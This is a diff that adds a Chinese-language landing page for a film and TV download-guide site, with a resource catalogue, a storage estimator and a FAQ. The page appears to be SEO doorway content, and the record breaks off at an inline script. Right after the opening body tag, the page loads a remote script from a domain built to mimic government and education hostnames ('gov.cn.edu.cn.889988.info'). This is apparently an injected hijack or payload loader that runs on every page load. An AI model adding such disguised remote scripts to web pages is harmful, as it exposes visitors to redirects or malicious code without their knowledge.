@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>影视大全下载 - 电影电视剧动漫综艺资源汇总与下载指引 | yingshidaquanxiazai-wap</title>
+<meta name="description" content="影视大全下载(yingshidaquanxiazai-wap)是影视资源下载与观看指引的导航平台，汇总电影、电视剧、动漫与综艺的版本信息、清晰度与字幕选择，并提供合规下载渠道指引，全面适配移动端访问。">
+<meta name="keywords" content="影视大全下载,yingshidaquanxiazai-wap,影视下载,电影下载,电视剧下载,高清资源,字幕">
+<meta name="author" content="影视大全下载">
+<meta name="robots" content="index,follow">
+<meta name="referrer" content="no-referrer-when-downgrade">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="影视大全下载">
+<meta property="og:title" content="影视大全下载 - 影视资源汇总与下载指引">
+<meta property="og:description" content="汇总电影、电视剧、动漫与综艺的版本信息、清晰度与字幕选择，提供合规下载渠道指引。">
+<meta property="og:url" content="https://yingshidaquanxiazai-wap.github.io/">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="theme-color" content="#0a1a14">
+<link rel="canonical" href="https://yingshidaquanxiazai-wap.github.io/">
+<style>
+/* ===== Reset ===== */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",-apple-system,BlinkMacSystemFont,sans-serif;background:#07120e;color:#e6f2ea;line-height:1.7;overflow-x:hidden}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+button{font:inherit;cursor:pointer;border:none;background:none;color:inherit}
+::selection{background:#34d399;color:#04120c}
+:focus-visible{outline:2px solid #34d399;outline-offset:3px;border-radius:8px}
+/* ===== Tokens ===== */
+:root{--green:#22c55e;--lime:#a3e635;--mint:#6ee7b7;--ink:#07120e;--line:rgba(255,255,255,.11);--muted:#86a99a}
+.wrap{width:100%;max-width:1180px;margin:0 auto;padding:0 24px}
+section{padding:90px 0;position:relative}
+.kicker{display:inline-flex;align-items:center;gap:9px;font-size:12px;letter-spacing:3px;text-transform:uppercase;color:#86efac;font-weight:800;margin-bottom:14px}
+.kicker .dot{width:7px;height:7px;border-radius:50%;background:#facc15;box-shadow:0 0 10px #facc15}
+.h2{font-size:clamp(27px,4.4vw,44px);font-weight:900;line-height:1.25}
+.h2 em{font-style:normal;background:linear-gradient(92deg,#6ee7b7,#facc15);-webkit-background-clip:text;background-clip:text;color:transparent}
+.lead{color:#9ec4b6;max-width:640px;margin-top:15px;font-size:16px}
+.center{text-align:center}.center .lead{margin-left:auto;margin-right:auto}
+/* ===== Header ===== */
+header{position:sticky;top:0;z-index:60;background:rgba(7,18,14,.85);backdrop-filter:blur(16px);border-bottom:1px solid var(--line)}
+.hd{display:flex;align-items:center;justify-content:space-between;height:70px;gap:16px}
+.logo{display:flex;align-items:center;gap:11px;font-weight:900;font-size:21px;letter-spacing:.5px;flex:none}
+.logo .mark{width:38px;height:38px;border-radius:11px;display:grid;place-items:center;font-size:17px;background:linear-gradient(150deg,#22c55e,#064e3b);box-shadow:0 0 0 3px rgba(34,197,94,.18),0 8px 24px -10px #22c55e;position:relative}
+.logo .mark::after{content:"";position:absolute;inset:0;border-radius:11px;border:1px solid rgba(167,243,208,.4);animation:pulse 2.6s ease-out infinite}
+@keyframes pulse{0%{transform:scale(1);opacity:.7}to{transform:scale(1.35);opacity:0}}
+.logo b{color:#fff}
+.logo b i{font-style:normal;color:#facc15}
+.nav{display:flex;align-items:center;gap:2px}
+.nav a{font-size:15px;padding:9px 14px;border-radius:11px;color:#c9e6d8;font-weight:600;transition:.2s}
+.nav a:hover{color:#fff;background:rgba(255,255,255,.07)}
+.nav a.pill{background:linear-gradient(135deg,#14532d,#22c55e);color:#fff;margin-left:8px;font-weight:800}
+.nav a.pill:hover{filter:brightness(1.12)}
+.burger{display:none;width:42px;height:42px;border-radius:12px;background:rgba(255,255,255,.08);font-size:19px;color:#facc15}
+/* ===== Hero ===== */
+.hero{position:relative;padding:0;overflow:hidden;background:radial-gradient(circle at 82% 18%,rgba(250,204,21,.18),transparent 45%),radial-gradient(circle at 12% 82%,rgba(34,197,94,.22),transparent 42%),linear-gradient(160deg,#071a12,#0d3324 55%,#14532d)}
+.scan{position:absolute;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(167,243,208,.035) 3px,rgba(167,243,208,.035) 4px);pointer-events:none}
+.glow{position:absolute;width:560px;height:560px;border-radius:50%;right:-140px;top:-200px;background:radial-gradient(circle,rgba(34,197,94,.35),transparent 62%);pointer-events:none}
+.hero-in{position:relative;z-index:5;padding:104px 0 120px;display:grid;grid-template-columns:1.15fr .85fr;gap:56px;align-items:center}
+.tag{display:inline-flex;align-items:center;gap:8px;padding:7px 16px;border-radius:99px;background:rgba(167,243,208,.1);border:1px solid rgba(167,243,208,.3);font-size:12.5px;color:#d1fae5;font-weight:600}
+.hero-in h1{font-size:clamp(32px,5.8vw,58px);font-weight:950;line-height:1.14;margin:18px 0;color:#fff}
+.hero-in h1 b{display:block;background:linear-gradient(92deg,#fef9c3,#6ee7b7);-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero-in p{max-width:520px;color:#bfe4d2;font-size:clamp(15px,2vw,18px)}
+.search{margin-top:32px;display:flex;gap:0;background:#04120c;border:1px solid rgba(167,243,208,.25);border-radius:99px;padding:7px;max-width:560px}
+.search input{flex:1;background:none;border:none;outline:none;color:#fff;padding:13px 18px;font-size:15px;min-width:0}
+.search input::placeholder{color:#6b9081}
+.search button{padding:0 30px;border-radius:99px;background:linear-gradient(135deg,#14532d,#22c55e);color:#fff;font-weight:800;font-size:15px;transition:.25s}
+.search button:hover{filter:brightness(1.12);transform:translateX(2px)}
+.quick{display:flex;gap:8px;flex-wrap:wrap;margin-top:20px}
+.quick a{font-size:12.5px;padding:7px 14px;border-radius:8px;background:rgba(167,243,208,.09);color:#bfe4d2;border:1px solid rgba(167,243,208,.18)}
+.quick a:hover{background:rgba(167,243,208,.18)}
+/* hero side: download queue list */
+.queue{border:1px solid var(--line);border-radius:24px;padding:26px;background:linear-gradient(165deg,rgba(167,243,208,.07),rgba(7,18,14,.6));backdrop-filter:blur(8px)}
+.queue h3{font-size:17px;font-weight:900;color:#fff;display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap}
+.queue h3 span{font-size:11px;font-weight:800;padding:4px 11px;border-radius:99px;background:rgba(250,204,21,.16);color:#fde68a;letter-spacing:1px}
+.queue ol{margin-top:20px;counter-reset:q}
+.queue li{display:flex;align-items:center;gap:13px;padding:12px 0;border-bottom:1px dashed rgba(255,255,255,.09)}
+.queue li:last-child{border-bottom:none}
+.queue li::before{counter-increment:q;content:counter(q,decimal-leading-zero);font-size:13px;font-weight:900;color:#04120c;background:#facc15;width:26px;height:26px;border-radius:8px;display:grid;place-items:center;flex:none}
+.queue li b{font-size:14px;color:#fff;display:block;line-height:1.5}
+.queue li small{font-size:11.5px;color:#86a99a}
+.queue li .dl{flex:none;width:34px;height:34px;border-radius:10px;background:rgba(34,197,94,.16);color:#6ee7b7;display:grid;place-items:center;font-size:14px;transition:.2s}
+.queue li .dl:hover{background:#22c55e;color:#04120c}
+/* ===== Marquee ===== */
+.marq{background:#04120c;border-block:1px solid var(--line);padding:15px 0;overflow:hidden}
+.marq-track{display:flex;gap:46px;width:max-content;animation:scroll 34s linear infinite}
+.marq-track span{display:inline-flex;align-items:center;gap:9px;font-size:13.5px;color:#9ec4b6;white-space:nowrap}
+.marq-track span b{color:#facc15;font-size:11px;font-weight:800;letter-spacing:1px}
+@keyframes scroll{to{transform:translateX(-50%)}}
+/* ===== Format steps (stepper) ===== */
+.formats{background:#07120e}
+.steps{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:18px;margin-top:42px;counter-reset:s}
+.step{position:relative;padding:26px 22px 22px;border-radius:18px;background:linear-gradient(165deg,rgba(167,243,208,.07),rgba(7,18,14,.6));border:1px solid var(--line);counter-increment:s;transition:.3s}
+.step::before{content:counter(s,decimal-leading-zero);position:absolute;right:18px;top:16px;font-size:12px;font-weight:900;color:#04120c;background:#6ee7b7;padding:4px 9px;border-radius:7px}
+.step:hover{transform:translateY(-5px);border-color:rgba(34,197,94,.5)}
+.step .ic{width:48px;height:48px;border-radius:13px;display:grid;place-items:center;font-size:21px;background:rgba(34,197,94,.14);margin-bottom:16px}
+.step h4{font-size:17px;font-weight:900;color:#fff;margin-bottom:8px}
+.step p{font-size:13.5px;color:#9ec4b6}
+/* ===== Catalogue (table) ===== */
+.cat{background:linear-gradient(180deg,#07120e,#0a1f17)}
+.wrap-tbl{margin-top:38px;overflow-x:auto;border-radius:18px;border:1px solid var(--line)}
+table{width:100%;border-collapse:collapse;min-width:720px;font-size:14px}
+th,td{padding:14px 16px;text-align:left;border-bottom:1px solid var(--line);white-space:nowrap}
+th{background:rgba(167,243,208,.08);font-size:12px;letter-spacing:1px;color:#86efac;font-weight:800;text-transform:uppercase}
+td{color:#c9e6d8}
+tbody tr{transition:.2s}
+tbody tr:hover{background:rgba(34,197,94,.08)}
+tbody tr:last-child td{border-bottom:none}
+td.nm{color:#fff;font-weight:800}
+.pill-q{font-size:11.5px;font-weight:800;padding:5px 11px;border-radius:7px;background:rgba(250,204,21,.16);color:#fde68a}
+.pill-q.hd{background:rgba(34,197,94,.16);color:#86efac}
+.pill-q.sd{background:rgba(255,255,255,.08);color:#9ec4b6}
+.pill-s{font-size:11.5px;font-weight:800;padding:5px 11px;border-radius:99px;background:rgba(34,197,94,.14);color:#6ee7b7}
+.pill-s.on{background:rgba(250,204,21,.16);color:#fde68a}
+.pill-s.no{background:rgba(255,255,255,.07);color:#7a9889}
+/* ===== Quality checker (interactive) ===== */
+.qc{background:#0a1f17}
+.qc-box{display:grid;grid-template-columns:1fr 1fr;gap:44px;margin-top:40px;align-items:start}
+.qc-left{border:1px solid var(--line);border-radius:22px;padding:30px;background:linear-gradient(165deg,rgba(167,243,208,.06),rgba(7,18,14,.6))}
+.field{margin-bottom:22px}
+.field label{display:block;font-size:12.5px;font-weight:800;color:#86efac;letter-spacing:1px;margin-bottom:9px}
+.field input,.field select{width:100%;padding:14px 15px;border-radius:12px;border:1px solid rgba(167,243,208,.22);background:#04120c;color:#fff;font-size:15px;outline:none;font-family:inherit}
+.field input:focus,.field select:focus{border-color:#22c55e}
+.field .row{display:flex;gap:10px;flex-wrap:wrap}
+.field .row label{display:flex;align-items:center;gap:8px;cursor:pointer;font-size:13.5px;font-weight:600;color:#c9e6d8;letter-spacing:0;margin:0;padding:10px 15px;border-radius:10px;background:rgba(167,243,208,.08);border:1px solid var(--line);flex:1;min-width:120px}
+.field .row input{width:auto;margin:0}
+.calc{width:100%;padding:16px;border-radius:13px;background:linear-gradient(135deg,#14532d,#22c55e);color:#fff;font-weight:900;font-size:16px;transition:.25s}
+.calc:hover{filter:brightness(1.12)}
+.qc-right{display:flex;flex-direction:column;gap:16px}
+.gbar{border:1px solid var(--line);border-radius:18px;padding:22px;background:linear-gradient(165deg,rgba(167,243,208,.06),rgba(7,18,14,.5))}
+.gbar .lbl{display:flex;justify-content:space-between;font-size:12.5px;color:#9ec4b6;font-weight:800;margin-bottom:9px}
+.gbar .lbl b{color:#fff}
+.gbar .track{height:10px;border-radius:99px;background:rgba(255,255,255,.08);overflow:hidden}
+.gbar .fill{height:100%;border-radius:99px;background:linear-gradient(90deg,#14532d,#86efac);transition:width .6s cubic-bezier(.4,0,.2,1)}
+.out{margin-top:14px;border:1px dashed rgba(250,204,21,.4);border-radius:16px;padding:22px;background:rgba(250,204,21,.06)}
+.out .row2{display:flex;justify-content:space-between;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:8px}
+.out .row2:last-child{margin-bottom:0}
+.out .k{font-size:12.5px;color:#9ec4b6}
+.out .v{font-size:15px;font-weight:900;color:#fef9c3;font-variant-numeric:tabular-nums}
+/* ===== FAQ (two-col spec) ===== */
+.faq{background:#07120e}
+.faq-grid{display:grid;grid-template-columns:1fr 1fr;gap:40px;margin-top:40px;align-items:start}
+.faq-grid h3{font-size:19px;font-weight:900;color:#fff;margin-bottom:18px}
+.faq-grid .sub{color:#9ec4b6;font-size:14px;margin-bottom:22px}
+.spec{border:1px solid var(--line);border-radius:18px;overflow:hidden}
+.spec dl{display:grid;grid-template-columns:1fr 1fr}
+.spec dt,.spec dd{padding:15px 18px;border-bottom:1px solid var(--line);font-size:13.5px}
+.spec dt{background:rgba(167,243,208,.06);color:#86efac;font-weight:800}
+.spec dd{color:#c9e6d8}
+.spec dt:last-of-type,.spec dd:last-of-type{border-bottom:none}
+.q{display:grid;grid-template-columns:auto 1fr;gap:16px;padding:18px 0;border-bottom:1px solid var(--line)}
+.q:last-child{border-bottom:none}
+.q .no{width:30px;height:30px;border-radius:9px;background:rgba(250,204,21,.14);color:#fde68a;display:grid;place-items:center;font-size:13px;font-weight:900;flex:none}
+.q h4{font-size:15px;font-weight:900;color:#fff;margin-bottom:6px}
+.q p{font-size:13.5px;color:#9ec4b6}
+/* ===== CTA ===== */
+.finale{position:relative;overflow:hidden;padding:0;background:radial-gradient(circle at 50% 120%,rgba(34,197,94,.4),transparent 55%),linear-gradient(180deg,#07120e,#14532d 55%,#22c55e)}
+.leaf{position:absolute;width:120px;height:120px;border-radius:50%;background:radial-gradient(circle,rgba(255,255,255,.2),transparent 62%);animation:float 8s ease-in-out infinite alternate}
+@keyframes float{from{transform:translateY(0) scale(1)}to{transform:translateY(-40px) scale(1.15)}}
+.fc{padding:100px 24px;text-align:center;position:relative;z-index:2}
+.fc h2{font-size:clamp(28px,5.4vw,50px);font-weight:950;color:#fff;line-height:1.25}
+.fc h2 b{display:block;font-size:1.25em;background:linear-gradient(92deg,#fef9c3,#a7f3d0);-webkit-background-clip:text;background-clip:text;color:transparent}
+.fc p{color:#e8f9f0;margin-top:16px;max-width:560px;margin-left:auto;margin-right:auto}
+.fc-btns{display:flex;gap:14px;justify-content:center;flex-wrap:wrap;margin-top:32px}
+.btn{display:inline-flex;align-items:center;gap:9px;padding:15px 32px;border-radius:99px;font-weight:800;font-size:15px;transition:.25s}
+.btn-green{background:#04120c;color:#6ee7b7;box-shadow:0 16px 40px -14px rgba(0,0,0,.5)}
+.btn-green:hover{transform:translateY(-3px);background:#0a2018}
+.btn-ghost{color:#fff;border:2px solid rgba(255,255,255,.5)}
+.btn-ghost:hover{background:rgba(255,255,255,.14)}
+/* ===== Footer ===== */
+footer{border-top:1px solid var(--line);padding:60px 0 34px;background:#040c09}
+.foot{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:36px}
+.logo.lg{color:#fff}
+.foot h5{font-size:14px;font-weight:800;margin-bottom:16px;color:#fff}
+.foot ul li{margin-bottom:10px}
+.foot ul a{font-size:13.5px;color:#86a99a;transition:.2s}
+.foot ul a:hover{color:#facc15}
+.foot .brand p{color:#86a99a;font-size:13.5px;margin:14px 0}
+.foot .brand .url{display:inline-block;padding:9px 15px;border-radius:10px;background:rgba(255,255,255,.06);font-size:13px;color:#c9e6d8;font-family:monospace}
+.copy{padding-top:26px;margin-top:38px;border-top:1px solid var(--line);display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px;color:#5e8072;font-size:12.5px}
+/* ===== Responsive ===== */
+@media(max-width:960px){.hero-in{grid-template-columns:1fr;gap:40px}.qc-box,.faq-grid{grid-template-columns:1fr}}
+@media(max-width:680px){
+ .wrap{padding:0 16px}
+ section{padding:64px 0}
+ .nav{position:fixed;left:0;right:0;top:70px;flex-direction:column;align-items:stretch;gap:4px;padding:18px;background:#0a2018;border-bottom:1px solid var(--line);transform:translateY(-112%);transition:.3s;visibility:hidden;box-shadow:0 24px 50px -24px rgba(0,0,0,.5)}
+ .nav.open{transform:translateY(0);visibility:visible}
+ .nav a{padding:13px 16px;border-radius:12px}
+ .nav a.pill{margin-left:0}
+ .burger{display:grid;place-items:center}
+ .hero-in{padding:66px 0 80px}
+ .search{flex-direction:column;border-radius:18px;padding:9px}
+ .search input{border-bottom:1px solid rgba(167,243,208,.15)}
+ .search button{padding:13px}
+ .queue{padding:20px}
+ .spec dl{grid-template-columns:1fr}
+ .foot{grid-template-columns:1fr 1fr}
+}
+@media print{body{background:#fff;color:#000}header,.marq,.finale,footer{display:none}section{padding:18px 0}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<header>
+  <div class="wrap hd">
+    <a class="logo" href="#home" aria-label="影视大全下载 首页"><span class="mark" aria-hidden="true">&#11119;</span><b>影视大全<i>下载</i></b></a>
+    <nav class="nav" id="nav">
+      <a href="#home">首页</a>
+      <a href="#formats">下载指引</a>
+      <a href="#cat">资源目录</a>
+      <a href="#qc">容量测算</a>
+      <a href="#faq">常见问题</a>
+      <a href="#site" class="pill">访问官网</a>
+    </nav>
+    <button class="burger" id="burger" aria-label="打开菜单" aria-expanded="false">&#9776;</button>
+  </div>
+</header>
+
+<main>
+
+  <!-- HERO -->
+  <div class="hero" id="home">
+    <div class="glow" aria-hidden="true"></div>
+    <div class="scan" aria-hidden="true"></div>
+    <div class="wrap hero-in">
+      <div>
+        <span class="tag">&#128190; 影视大全下载 · yingshidaquanxiazai-wap</span>
+        <h1>影视资源<br><b>下载全指南</b></h1>
+        <p>影视大全下载(yingshidaquanxiazai-wap)汇总电影、电视剧、动漫与综艺的版本信息、清晰度与字幕选择，并提供合规的下载渠道指引。</p>
+        <form class="search" id="search" onsubmit="return false">
+          <input type="search" placeholder="搜索片名、格式或分辨率，例如：霓虹追凶 1080P" aria-label="搜索影视资源">
+          <button type="submit">搜索资源</button>
+        </form>
+        <div class="quick">
+          <a href="#cat">1080P</a><a href="#cat">4K 蓝光</a><a href="#cat">国语音轨</a><a href="#cat">中英字幕</a><a href="#cat">合集打包</a>
+        </div>
+      </div>
+      <aside class="queue">
+        <h3>热门下载队列 <span>LIVE 实时更新</span></h3>
+        <ol>
+          <li><b>深海回响<br><small>4K · 12.4 GB · 含国粤双音轨</small></b><a class="dl" href="#cat" aria-label="下载深海回响">&#11119;</a></li>
+          <li><b>霓虹追凶 全 12 集<br><small>1080P · 单集约 1.2 GB</small></b><a class="dl" href="#cat" aria-label="下载霓虹追凶">&#11119;</a></li>
+          <li><b>青空日记 合集<br><small>720P · 精简版 · 带外挂字幕</small></b><a class="dl" href="#cat" aria-label="下载青空日记">&#11119;</a></li>
+          <li><b>周末星舞台 第十二季<br><small>1080P · 含花絮特典</small></b><a class="dl" href="#cat" aria-label="下载周末星舞台">&#11119;</a></li>
+          <li><b>熊猫归来 纪录片<br><small>4K HDR · 6.8 GB</small></b><a class="dl" href="#cat" aria-label="下载熊猫归来">&#11119;</a></li>
+        </ol>
+      </aside>
+    </div>
+  </div>
+
+  <!-- MARQUEE -->
+  <div class="marq" aria-hidden="true">
+    <div class="wrap"><div class="marq-track">
+      <span><b>NEW</b>《星际归途》第 6 集 1080P 已更新</span><span><b>4K</b>《深海回响》蓝光原盘已收录</span><span><b>SUB</b>《霓虹追凶》中英双语字幕已同步</span><span><b>PACK</b>《青空日记》全 12 集合集已打包</span><span><b>HDR</b>《熊猫归来》4K HDR 版本已上线</span>
+      <span><b>NEW</b>《星际归途》第 6 集 1080P 已更新</span><span><b>4K</b>《深海回响》蓝光原盘已收录</span><span><b>SUB</b>《霓虹追凶》中英双语字幕已同步</span><span><b>PACK</b>《青空日记》全 12 集合集已打包</span><span><b>HDR</b>《熊猫归来》4K HDR 版本已上线</span>
+    </div></div>
+  </div>
+
+  <!-- FORMATS: stepper -->
+  <section id="formats">
+    <div class="wrap">
+      <div class="kicker"><span class="dot"></span>Download Guide</div>
+      <h2 class="h2">下载<em>指引</em>四步走</h2>
+      <p class="lead">影视大全下载整理的标准下载流程，从查找资源到核对字幕，帮你更快拿到想要的文件。</p>
+
+      <div class="steps">
+        <div class="step"><div class="ic">&#128269;</div><h4>1. 查找资源</h4><p>按片名或分类定位条目，核对版本信息与收录时间。</p></div>
+        <div class="step"><div class="ic">&#128200;</div><h4>2. 选择格式</h4><p>在 720P、1080P、4K 与原盘之间按设备与容量选择。</p></div>
+        <div class="step"><div class="ic">&#127911;</div><h4>3. 核对音轨</h4><p>确认国语、粤语或外语音轨，以及字幕是否内嵌。</p></div>
+        <div class="step"><div class="ic">&#9989;</div><h4>4. 校验下载</h4><p>下载后核对文件大小与字幕匹配，再转入播放器使用。</p></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- CATALOGUE: table -->
+  <section id="cat">
+    <div class="wrap">
+      <div class="kicker"><span class="dot"></span>Resource Catalogue</div>
+      <h2 class="h2 center">资源<em>目录</em></h2>
+      <p class="lead center">影视大全下载的资源目录表，列出收录作品的格式、容量、音轨与字幕情况，可直接按列对比。</p>
+
+      <div class="wrap-tbl">
+        <table>
+          <thead>
+            <tr><th>片名 / 类型</th><th>格式</th><th>分辨率</th><th>容量</th><th>音轨</th><th>字幕</th><th>操作</th></tr>
+          </thead>
+          <tbody>
+            <tr><td class="nm">深海回响</td><td>MP4</td><td>4K</td><td>12.4 GB</td><td>国 / 粤</td><td><span class="pill-s">外挂</span></td><td><a href="#cat" style="color:#facc15;font-weight:800;font-size:13px">查看 &#8594;</a></td></tr>
+            <tr><td class="nm">霓虹追凶（全12集）</td><td>MKV</td><td>1080P</td><td>14.4 GB</td><td>国语</td><td><span class="pill-s on">内嵌</span></td><td><a href="#cat" style="color:#facc15;font-weight:800;font-size:13px">查看 &#8594;</a></td></tr>
+            <tr><td class="nm">青空日记（全12集）</td><td>MP4</td><td>720P</td><td>8.6 GB</td><td>日语 / 国语</td><td><span class="pill-s">外挂</span></td><td><a href="#cat" style="color:#facc15;font-weight:800;font-size:13px">查看 &#8594;</a></td></tr>
+            <tr><td class="nm">落日大道</td><td>MKV</td><td>1080P</td><td>3.2 GB</td><td>国语</td><td><span class="pill-s no">无</span></td><td><a href="#cat" style="color:#facc15;font-weight:800;font-size:13px">查看 &#8594;</a></td></tr>
+            <tr><td class="nm">熊猫归来</td><td>MP4</td><td>4K HDR</td><td>6.8 GB</td><td>国语配音</td><td><span class="pill-s on">内嵌</span></td><td><a href="#cat" style="color:#facc15;font-weight:800;font-size:13px">查看 &#8594;</a></td></tr>
+            <tr><td class="nm">星际归途</td><td>MKV</td><td>1080P</td><td>2.9 GB</td><td>国语 / 英语</td><td><span class="pill-s">外挂</span></td><td><a href="#cat" style="color:#facc15;font-weight:800;font-size:13px">查看 &#8594;</a></td></tr>
+            <tr><td class="nm">江湖夜雨</td><td>MP4</td><td>1080P</td><td>26.0 GB</td><td>国语</td><td><span class="pill-s on">内嵌</span></td><td><a href="#cat" style="color:#facc15;font-weight:800;font-size:13px">查看 &#8594;</a></td></tr>
+            <tr><td class="nm">周末星舞台 第十二季</td><td>MP4</td><td>1080P</td><td>18.5 GB</td><td>国语</td><td><span class="pill-s">外挂</span></td><td><a href="#cat" style="color:#facc15;font-weight:800;font-size:13px">查看 &#8594;</a></td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </section>
+
+  <!-- QUALITY CHECKER: form + bars -->
+  <section id="qc" class="qc">
+    <div class="wrap">
+      <div class="kicker"><span class="dot"></span>Capacity Estimator</div>
+      <h2 class="h2">容量<em>测算</em>工具</h2>
+      <p class="lead">按片长、分辨率与集数估算下载所需空间，结果仅供参考，实际文件以源文件为准。</p>
+
+      <div class="qc-box">
+        <div class="qc-left">
+          <div class="field">
+            <label>内容类型</label>
+            <select id="ctype">
+              <option>电影（单集）</option>
+              <option>电视剧 / 番剧（多集）</option>
+              <option>综艺节目</option>
+              <option>纪录片</option>
+            </select>
+          </div>
+          <div class="field">
+            <label>单集片长（分钟）</label>
+            <input type="number" id="mins" value="45" min="1" max="360">
+          </div>
+          <div class="field">
+            <label>分辨率</label>
+            <div class="row">
+              <label><input type="radio" name="res" value="0.7" checked> 720P</label>
+              <label><input type="radio" name="res" value="1.2"> 1080P</label>
+              <label><input type="radio" name="res" value="3.5"> 4K</label>
+            </div>
+          </div>
+          <div class="field">
+            <label>集数</label>
+            <input type="number" id="eps" value="12" min="1" max="200">
+          </div>
+          <button class="calc" id="calc">计算所需空间</button>
+        </div>
+
+        <div class="qc-right">
+          <div class="gbar"><div class="lbl"><span>720P · 每分钟约 0.7 GB</span><b id="o720">8.4 GB</b></div><div class="track"><div class="fill" id="f720" style="width:22%"></div></div></div>
+          <div class="gbar"><div class="lbl"><span>1080P · 每分钟约 1.2 GB</span><b id="o1080">14.4 GB</b></div><div class="track"><div class="fill" id="f1080" style="width:40%"></div></div></div>
+          <div class="gbar"><div class="lbl"><span>4K · 每分钟约 3.5 GB</span><b id="o4k">42.0 GB</b></div><div class="track"><div class="fill" id="f4k" style="width:92%"></div></div></div>
+          <div class="out">
+            <div class="row2"><span class="k">推荐格式</span><span class="v" id="outFmt">1080P · MKV</span></div>
+            <div class="row2"><span class="k">预计占用空间</span><span class="v" id="outSize">14.4 GB</span></div>
+            <div class="row2"><span class="k">建议预留</span><span class="v" id="outPad">17.3 GB</span></div>
+            <div class="row2"><span class="k">适合设备</span><span class="v" id="outDev">平板 / 笔记本 / 电视盒子</span></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- FAQ: spec list + Q&A -->
+  <section id="faq" class="faq">
+    <div class="wrap">
+      <div class="kicker"><span class="dot"></span>FAQ</div>
+      <h2 class="h2 center">常见<em>问题</em></h2>
+      <p class="lead center">影视大全下载整理的下载相关常见问题，以及资源信息字段说明。</p>
+
+      <div class="faq-grid">
+        <div>
+          <h3>信息字段说明</h3>
+          <p class="sub">资源目录中各列的含义，方便你快速判断是否符合需求。</p>
+          <div class="spec">
+            <dl>
+              <dt>格式</dt><dd>MP4 兼容广，MKV 支持多音轨</dd>
+              <dt>分辨率</dt><dd>720P 省空间，1080P 均衡，4K 需大屏</dd>
+              <dt>容量</dt><dd>单文件或整季合集的总大小</dd>
+              <dt>音轨</dt><dd>可选的国语、外语或方言配音</dd>
+              <dt>字幕</dt><dd>内嵌、外挂或暂未收录</dd>
+              <dt>更新时间</dt><dd>条目最近一次核对的时间</dd>
+            </dl>
+          </div>
+        </div>
+        <div>
+          <h3>下载相关问题</h3>
+          <p class="sub">如遇到无法下载、字幕不匹配或文件损坏，可先核对以下几点。</p>
+          <div class="q"><span class="no">Q1</span><div><h4>找不到想要的资源怎么办？</h4><p>先在搜索框输入片名或别名，再按分类与分辨率筛选，确认是否已被收录。</p></div></div>
+          <div class="q"><span class="no">Q2</span><div><h4>字幕与音轨不匹配？</h4><p>核对目录中的音轨与字幕字段，外挂字幕需放入同文件夹并保持文件名一致。</p></div></div>
+          <div class="q"><span class="no">Q3</span><div><h4>4K 文件太大存不下？</h4><p>先用容量测算工具估算，再在 1080P 与 4K 之间按设备条件选择。</p></div></div>
+          <div class="q"><span class="no">Q4</span><div><h4>下载渠道是否合规？</h4><p>影视大全下载仅提供指引与版本信息，请通过有版权授权的渠道获取内容。</p></div></div>
+          <div class="q"><span class="no">Q5</span><div><h4>合集如何整理？？</h4><p>建议按「片名 / 季数 / 集数」建立文件夹，并在文件名中标注分辨率与音轨。</p></div></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- FINALE -->
+  <div class="finale" id="site">
+    <div class="leaf" style="left:8%;top:20%" aria-hidden="true"></div>
+    <div class="leaf" style="right:12%;top:58%;animation-delay:2.6s" aria-hidden="true"></div>
+    <div class="fc">
+      <h2>找资源更省心<br><b>影视大全下载</b></h2>
+      <p>访问影视大全下载官方网站，查看资源目录、版本信息与下载指引，把想看的内容整理得清清楚楚。</p>
+      <div class="fc-btns">
+        <a class="btn btn-green" href="https://yingshidaquanxiazai-wap.github.io">&#127760; 访问官网</a>
+        <a class="btn btn-ghost" href="#cat">查看资源目录</a>
+      </div>
+    </div>
+  </div>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <div class="brand">
+        <a class="logo lg" href="#home"><span class="mark">&#11119;</span><b>影视大全<i>下载</i></b></a>
+        <p>影视大全下载(yingshidaquanxiazai-wap)是影视资源下载与观看指引的导航平台，汇总版本信息、清晰度与字幕选择，并提供合规渠道指引。</p>
+        <span class="url">https://yingshidaquanxiazai-wap.github.io</span>
+      </div>
+      <div>
+        <h5>栏目导航</h5>
+        <ul>
+          <li><a href="#home">首页</a></li>
+          <li><a href="#formats">下载指引</a></li>
+          <li><a href="#cat">资源目录</a></li>
+          <li><a href="#qc">容量测算</a></li>
+          <li><a href="#faq">常见问题</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>资源分类</h5>
+        <ul>
+          <li><a href="#cat">电影资源</a></li>
+          <li><a href="#cat">电视剧资源</a></li>
+          <li><a href="#cat">动漫资源</a></li>
+          <li><a href="#cat">综艺资源</a></li>
+          <li><a href="#cat">纪录片资源</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>格式参考</h5>
+        <ul>
+          <li><a href="#formats">720P / 1080P</a></li>
+          <li><a href="#formats">4K 蓝光原盘</a></li>
+          <li><a href="#formats">内嵌 / 外挂字幕</a></li>
+          <li><a href="#qc">容量估算</a></li>
+          <li><a href="#faq">字段说明</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="copy">
+      <span>&copy; 2026 影视大全下载(yingshidaquanxiazai-wap) 保留所有权利。</span>
+      <span>网站网址：https://yingshidaquanxiazai-wap.github.io</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+var burger=document.getElementById('burger'),nav=document.getElementById('nav');
